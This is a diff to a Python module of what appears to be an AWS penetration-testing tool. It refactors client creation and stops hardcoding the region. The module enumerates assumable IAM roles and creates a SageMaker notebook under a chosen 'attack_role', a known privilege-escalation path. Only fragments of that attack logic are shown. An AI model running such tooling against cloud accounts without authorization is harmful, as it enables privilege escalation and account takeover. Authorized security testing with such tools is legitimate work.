@@ -7,10 +7,7 @@ import datetime
 from dateutil.tz import tzutc
 from colorama import Fore, Style
 from modules.enumeration import iam_enumerate_assume_role
-
-def create_client(botoconfig, session, service):
-    client = session.client(service, config=botoconfig)
-    return client
+from functions import create_client
 
 def help():
     print(Fore.YELLOW + "\n================================================================================================" + Style.RESET_ALL)
@@ -50,8 +47,8 @@ def check_permissions(selected_session):
 
 def check_assumable_roles(botoconfig, session):
     service = 'iam'
-    client = create_client(botoconfig, session, service)
-    assumable_roles = iam_enumerate_assume_role.get_assumable_roles(client)
+    client = create_client.Client(botoconfig, session, service)
+    assumable_roles = iam_enumerate_assume_role.get_assumable_roles(client.create_aws_client())
 
     sage_maker_assumable_roles = []
     
@@ -99,7 +96,7 @@ def create_notebook(botoconfig, session, attack_role):
             InstanceType='ml.t2.medium',
             RoleArn=attack_role
         )
-        return notebook_arn, client
+        return notebook_arn, client, region
 
     except Exception as e:
         print("[-] It was "+Fore.RED+"not possible "+Style.RESET_ALL+"to create a notebook...please check if you have the apropriate permissions")
@@ -150,11 +147,11 @@ def main(botoconfig, session, selected_session):
         attack_role = parse_assumable_role_option(assumable_roles)
 
         print("[+] Using the following role to create notebook: "+Fore.GREEN+"{}".format(attack_role)+Style.RESET_ALL)
-        notebook_arn, sagemaker_client = create_notebook(botoconfig, session, attack_role)
+        notebook_arn, sagemaker_client, region = create_notebook(botoconfig, session, attack_role)
         print("[+] Notebook Arn: "+Fore.GREEN+"{}".format(notebook_arn['NotebookInstanceArn'])+Style.RESET_ALL)
 
         print("[+] Waiting for notebook to activate...this can take some time...")
-        sagemaker_client = session.client('sagemaker', config=botoconfig, region_name='us-east-1')
+        sagemaker_client = session.client('sagemaker', config=botoconfig, region_name=region)
         while True:
             token = check_notebook_status(sagemaker_client)
             if token:
